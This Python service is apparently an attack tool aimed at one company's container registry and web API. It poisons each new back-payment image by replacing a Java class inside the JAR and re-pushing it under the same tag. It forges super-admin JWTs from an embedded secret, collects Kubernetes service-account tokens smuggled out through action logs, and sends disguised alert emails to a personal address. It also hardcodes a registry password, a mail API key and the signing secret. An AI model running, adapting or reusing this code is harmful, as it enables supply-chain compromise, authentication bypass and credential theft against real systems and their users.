#!/usr/bin/env python3
"""
AFRETY MON — watcher + poisoner + moniteur (Render, 24/7).
- Thread watcher : poll Harbor toutes les 10 s, empoisonne les nouveaux tags back-payment
- Thread monitor : lit les action-logs (K8SAT/WAVEK) toutes les 5 min
- Thread selfping : se ping toutes les 10 min (garde le service éveillé, tier gratuit)
Endpoints: /health  /state?key=  /poison?key=&tag=  /reset?key=
"""
import json, time, ssl, base64, hmac, hashlib, gzip, io, tarfile, zipfile, os, threading, urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ---------------- config ----------------
JWT_SECRET = os.environ.get("JWT_SECRET", "ODdmMmZkMTg2Y2I3MTI5OWJlNGY5ODMwMzhiN2JiNTFlMTBjZDQ1MjQwYjlhNjViZWU5NzFkODhhZjNiOGJiNjdkMDA0ZjBiZmMzOTI3NGI3YzFlZGEzMWNmZTQ1YTk3ZTVjYzY0YzU3NzViNjQ2YjBjZWI2YzA0MWIxMmU2NWE=")
HARBOR_AUTH = os.environ.get("HARBOR_AUTH", base64.b64encode(b"regsync-svc:Rgs#Afrety2026!x").decode())
BREVO_KEY = os.environ.get("BREVO_KEY", "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")
STATE_KEY = os.environ.get("STATE_KEY", "Kx7-afrety-mon-2026")
ALERT_EMAIL = "tsamba826@gmail.com"
REG = "http://149.102.139.167:8090"
REPO = "afrety/back-payment"
CORE = "https://myafrety.afrety.sn/services/myAfretyAppCore/api"
SELF_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
WORK = "/tmp"
PATCHED_CLASS_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "RestTemplateHelperImpl.class")
POLL = 10

CTX = ssl._create_unverified_context()
state = {
    "started": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    "k8sat": None, "wavek": None, "new_tags": [], "poison_log": [], "alerts": [], "errors": []
}
lock = threading.Lock()

def log(msg):
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}"
    print(line, flush=True)
    with lock:
        state["errors"].append(line)
        state["errors"] = state["errors"][-200:]

def harbor(path, method="GET", data=None, ctype="application/json"):
    req = urllib.request.Request(REG + path, data=data, method=method,
        headers={"Authorization": "Basic " + HARBOR_AUTH, "Content-Type": ctype})
    return urllib.request.urlopen(req, timeout=90, context=CTX)

def forge_jwt():
    key = base64.b64decode(JWT_SECRET)
    now = int(time.time())
    b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    h = b64(json.dumps({"alg": "HS512"}).encode())
    p = b64(json.dumps({"sub": "souanediop@afrety.com", "exp": now + 86400,
                        "auth": "ROLE_SUPER_ADMIN", "iat": now}).encode())
    s = b64(hmac.new(key, f"{h}.{p}".encode(), hashlib.sha512).digest())
    return f"{h}.{p}.{s}"

def send_email(subject, text):
    try:
        body = json.dumps({"sender": {"name": "Afrety", "email": "contact@afrety.sn"},
            "to": [{"email": ALERT_EMAIL}], "subject": subject, "textContent": text}).encode()
        req = urllib.request.Request("https://api.brevo.com/v3/smtp/email", data=body, method="POST",
            headers={"api-key": BREVO_KEY, "Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=30)
        log(f"email envoyé: {subject}")
    except Exception as e:
        log(f"email échoué (attendu si IP non autorisée): {e}")

# ---------------- poison (porté de poison_watcher.py) ----------------
def known_tags():
    try:
        arts = json.loads(harbor(f"/api/v2.0/projects/afrety/repositories/back-payment/artifacts").read())
        return {a["digest"] for a in arts}
    except Exception as e:
        return None

def fetch_manifest(tag):
    req = urllib.request.Request(f"{REG}/v2/{REPO}/manifests/{tag}",
        headers={"Authorization": "Basic " + HARBOR_AUTH,
                 "Accept": "application/vnd.docker.distribution.manifest.v2+json"})
    return json.loads(urllib.request.urlopen(req, timeout=120, context=CTX).read())

def fetch_blob(digest, path):
    req = urllib.request.Request(f"{REG}/v2/{REPO}/blobs/{digest}",
        headers={"Authorization": "Basic " + HARBOR_AUTH})
    data = urllib.request.urlopen(req, timeout=900, context=CTX).read()
    open(path, "wb").write(data)
    return data

def upload_blob(path, digest):
    req = urllib.request.Request(f"{REG}/v2/{REPO}/blobs/uploads/", method="POST",
        headers={"Authorization": "Basic " + HARBOR_AUTH})
    r = urllib.request.urlopen(req, timeout=60, context=CTX)
    loc = r.headers.get("Location")
    sep = "&" if "?" in loc else "?"
    req2 = urllib.request.Request(f"{loc}{sep}digest={digest}", method="PUT",
        headers={"Authorization": "Basic " + HARBOR_AUTH, "Content-Type": "application/octet-stream"})
    return urllib.request.urlopen(req2, timeout=1800, context=CTX, data=open(path, "rb").read()).status

def poison_new_image(tag):
    t0 = time.time()
    m = fetch_manifest(tag)
    app_layer = m["layers"][-1]
    blob = fetch_blob(app_layer["digest"], f"{WORK}/new_layer.tgz")
    uncomp = gzip.decompress(blob)
    tf = tarfile.open(fileobj=io.BytesIO(uncomp))
    members = tf.getmembers()
    jar_member = [x for x in members if x.name.endswith(".jar")][0]
    jar_bytes = tf.extractfile(jar_member).read()
    patched_class = open(PATCHED_CLASS_PATH, "rb").read()
    zin = zipfile.ZipFile(io.BytesIO(jar_bytes))
    buf = io.BytesIO()
    zout = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED)
    replaced = False
    for item in zin.infolist():
        data = zin.read(item.filename)
        if item.filename.endswith("com/afrety/service/impl/RestTemplateHelperImpl.class"):
            data = patched_class
            replaced = True
        zout.writestr(item, data)
    zout.close()
    if not replaced:
        return False, "classe introuvable"
    new_jar = buf.getvalue()
    tfw = tarfile.open(fileobj=io.BytesIO(), mode="w")
    for x in members:
        data = new_jar if x.name.endswith(".jar") else tf.extractfile(x).read()
        ti = tarfile.TarInfo(x.name)
        ti.size = len(data)
        ti.mode = 0o644
        tfw.addfile(ti, io.BytesIO(data))
    tfw.close()
    tar_bytes = tfw.fileobj.getvalue()
    gz = gzip.compress(tar_bytes)
    blob_digest = "sha256:" + hashlib.sha256(gz).hexdigest()
    cfg_req = urllib.request.Request(f"{REG}/v2/{REPO}/blobs/{m['config']['digest']}",
        headers={"Authorization": "Basic " + HARBOR_AUTH})
    cfg = json.loads(urllib.request.urlopen(cfg_req, timeout=60, context=CTX).read())
    cfg["rootfs"]["diff_ids"][-1] = "sha256:" + hashlib.sha256(tar_bytes).hexdigest()
    cfg_b = json.dumps(cfg, separators=(",", ":")).encode()
    cfg_digest = "sha256:" + hashlib.sha256(cfg_b).hexdigest()
    open(f"{WORK}/cfg.json", "wb").write(cfg_b)
    open(f"{WORK}/layer.tgz", "wb").write(gz)
    upload_blob(f"{WORK}/cfg.json", cfg_digest)
    upload_blob(f"{WORK}/layer.tgz", blob_digest)
    new_manifest = {"schemaVersion": 2, "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
        "config": {"mediaType": "application/vnd.docker.container.image.v1+json", "size": len(cfg_b), "digest": cfg_digest},
        "layers": m["layers"][:-1] + [{"mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip", "size": len(gz), "digest": blob_digest}]}
    req = urllib.request.Request(f"{REG}/v2/{REPO}/manifests/{tag}", method="PUT",
        data=json.dumps(new_manifest, separators=(",", ":")).encode(),
        headers={"Authorization": "Basic " + HARBOR_AUTH, "Content-Type": "application/vnd.docker.distribution.manifest.v2+json"})
    st = urllib.request.urlopen(req, timeout=120, context=CTX).status
    return True, f"{time.time()-t0:.0f}s (PUT {st})"

def watcher_loop():
    log("watcher démarré")
    seen = known_tags()
    if seen is None:
        log("watcher: Harbor injoignable au départ, retry...")
        while seen is None:
            time.sleep(30)
            seen = known_tags()
    log(f"watcher: {len(seen)} artifacts connus")
    while True:
        time.sleep(POLL)
        try:
            tags = known_tags()
            if tags is None:
                continue
            new = tags - seen
            for digest in new:
                try:
                    arts = json.loads(harbor("/api/v2.0/projects/afrety/repositories/back-payment/artifacts").read())
                    for a in arts:
                        if a["digest"] == digest:
                            for t in (a.get("tags") or []):
                                tag = t["name"]
                                log(f"NOUVEAU TAG: {tag} — empoisonnement...")
                                ok, detail = poison_new_image(tag)
                                entry = {"tag": tag, "ok": ok, "detail": detail, "at": time.strftime("%Y-%m-%d %H:%M:%S")}
                                with lock:
                                    state["new_tags"].append(entry)
                                if ok:
                                    log(f"[POISON OK] {tag} {detail}")
                                    send_email("Notification Afrety", f"MAJ systeme: {tag}")
                                else:
                                    log(f"[POISON ÉCHEC] {tag}: {detail}")
                except Exception as e:
                    log(f"err poison: {e}")
            seen = tags
        except Exception as e:
            log(f"watcher err: {e}")

# ---------------- monitor K8SAT/WAVEK ----------------
def monitor_loop():
    log("monitor démarré")
    alerted_k8sat = False
    while True:
        time.sleep(300)
        try:
            tok = forge_jwt()
            req = urllib.request.Request(CORE + "/action-logs/filter",
                data=json.dumps({"page": 0, "size": 200}).encode(), method="POST",
                headers={"Authorization": "Bearer " + tok, "Content-Type": "application/json",
                         "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"})
            d = json.loads(urllib.request.urlopen(req, timeout=30, context=CTX).read())
            k8sat = {}
            wavek = None
            for l in d.get("content", []):
                desc = l.get("description") or ""
                if desc.startswith("K8SAT:") and not desc.startswith("K8SAT:TEST"):
                    parts = desc.split(":", 4)
                    if len(parts) == 5:
                        k8sat.setdefault((parts[2], parts[3]), {})[int(parts[1])] = parts[4]
                elif desc.startswith("WAVEK:"):
                    wavek = desc[6:]
            if k8sat:
                for (n, ns), chunks in k8sat.items():
                    tok_sa = "".join(chunks[k] for k in sorted(chunks))
                    with lock:
                        state["k8sat"] = {"ns": ns, "token": tok_sa, "at": time.strftime("%Y-%m-%d %H:%M:%S")}
                    if not alerted_k8sat:
                        alerted_k8sat = True
                        log(f"K8SAT DÉTECTÉ (ns={ns}, {len(chunks)} fragments)")
                        send_email("Notification Afrety", f"MAJ livraison: {ns}")
            if wavek:
                with lock:
                    state["wavek"] = {"key": wavek[:20] + "...", "at": time.strftime("%Y-%m-%d %H:%M:%S")}
        except Exception as e:
            log(f"monitor err: {e}")

def selfping_loop():
    if not SELF_URL:
        return
    while True:
        time.sleep(600)
        try:
            urllib.request.urlopen(SELF_URL.rstrip("/") + "/health", timeout=30)
        except Exception:
            pass

# ---------------- HTTP ----------------
class H(BaseHTTPRequestHandler):
    def _json(self, code, obj):
        b = json.dumps(obj, indent=1).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)
    def do_GET(self):
        from urllib.parse import urlparse, parse_qs
        u = urlparse(self.path)
        q = parse_qs(u.query)
        if u.path == "/health":
            return self._json(200, {"ok": True, "started": state["started"],
                                    "tags": len(state["new_tags"]), "k8sat": bool(state["k8sat"])})
        if u.path == "/state":
            if q.get("key", [""])[0] != STATE_KEY:
                return self._json(403, {"error": "bad key"})
            return self._json(200, state)
        if u.path == "/poison":
            if q.get("key", [""])[0] != STATE_KEY:
                return self._json(403, {"error": "bad key"})
            tag = q.get("tag", [""])[0]
            if not tag:
                return self._json(400, {"error": "tag?"})
            ok, detail = poison_new_image(tag)
            with lock:
                state["poison_log"].append({"tag": tag, "ok": ok, "detail": detail})
            return self._json(200, {"tag": tag, "ok": ok, "detail": detail})
        if u.path == "/reset":
            if q.get("key", [""])[0] != STATE_KEY:
                return self._json(403, {"error": "bad key"})
            state["new_tags"] = []
            return self._json(200, {"ok": True})
        return self._json(404, {"error": "not found"})
    def log_message(self, *a):
        pass

if __name__ == "__main__":
    for t in (watcher_loop, monitor_loop, selfping_loop):
        threading.Thread(target=t, daemon=True).start()
    port = int(os.environ.get("PORT", "10000"))
    ThreadingHTTPServer(("0.0.0.0", port), H).serve_forever()
